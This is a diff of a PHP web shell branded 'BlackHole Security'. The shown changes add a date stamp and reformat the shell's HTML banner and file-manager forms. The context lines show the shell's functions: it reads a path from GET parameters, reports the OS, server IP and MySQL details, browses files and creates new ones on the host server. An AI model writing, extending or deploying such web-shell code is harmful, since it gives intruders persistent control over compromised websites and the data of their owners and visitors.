@@ -351,7 +351,7 @@ $color_rea="yellow";
 $color_non="red";
 $path=$_GET['path'];
 $sep="/";
-
+$date=date('d-M-Y H:i');
 if(strtolower(substr(PHP_OS,0,3)) == "win") {
     $os="win";
     $sep="\\";
@@ -437,19 +437,19 @@ _________                     ____ ________  ______     _____
  \______  / \_/  (____  /__|  |___| /____/ \______  /\____   | 
         \/            \/                          \/      |__| 
 	</pre>
-	</a><font
+</a><font
 color=yellow>=========== BlackHole Security ===========</font>
-            </div>
-            </td>
-            <td>
-            <div class=\"header\">OS</font> <font
-color=\"#666\" >:</font>
-            ".$ox." </font> <font
-color=\"#666\" >|</font>
+</div></td>
+<td>
+<div class=\"header\">OS</font>
+<font color=\"#666\" >:</font>
+".$ox." </font> <font color=\"#666\" >|</font>
 ".php_uname()."<br>
-            Your IP : <font color=red>".$your_ip."</font>
-			<font color=\"#666\" >|</font> Server IP : <font color=red>".$srvr_ip."</font> 
-			<font color=\"#666\" > | </font> Admin <font color=\"#666\" > : </font>
+ Your IP : <font color=red>".$your_ip."</font>
+<font color=\"#666\" >|</font>
+ Server IP : <font color=red>".$srvr_ip."</font>
+ <font color=\"#666\" > | </font>
+  Admin <font color=\"#666\" > : </font>
 			<font color=red> {$admin} </font><br>MySQL <font color=\"#666\" > : </font>"; 
 			echo mysqlx();
             echo "<font color=\"#666\" > |
@@ -2635,12 +2635,15 @@ else if(isset($_GET['c_file']) && isset($_GET['c_target']) && isset($_GET['cn_na
     filemanager_bg();
 }
 echo "</div>
-<div id=result><center><p><table class='tbl'>
-      <tr><td><form method='GET'>PWD : <input size='50' name='path' value='".getcwd()."'>
-	  <input type='submit' value='O'></form></td></tr></table>
-      <table class='tbl'><tr>
-          <td><form style='float:right;' method='GET'>
-		  <input name='path' value='".getcwd()."' type=hidden><span> New File : </span>
+<div id=result>
+<center><p>
+<table class='tbl'><tr><td>
+<form method='GET'>PWD :
+ <input size='50' name='path' value='".getcwd()."'>
+<input type='submit' value='O'></form></td></tr></table>
+<table class='tbl'><tr>
+<td><form style='float:right;' method='GET'>
+<input name='path' value='".getcwd()."' type=hidden><span> New File : </span>
 		  <input type='submit' value='O'>
 		  <input size='40' name='new_file'></form>
           </td>
@@ -2666,6 +2669,6 @@ echo "</div>
           </td>
         </tr>
       </table></p>
-	  <p><font size=4 color=yellow>
-	  <a style='color:yellow; text-decoration:none;' href=https://Cvar1984.Sarahah.com>Feedback</a></font></div>"
+<font size=4 color=yellow>
+<a style='color:yellow;text-decoration:none;' href=https://Cvar1984.Sarahah.com>Feedback</a></center>Date : $date</font></div>";
 ?>
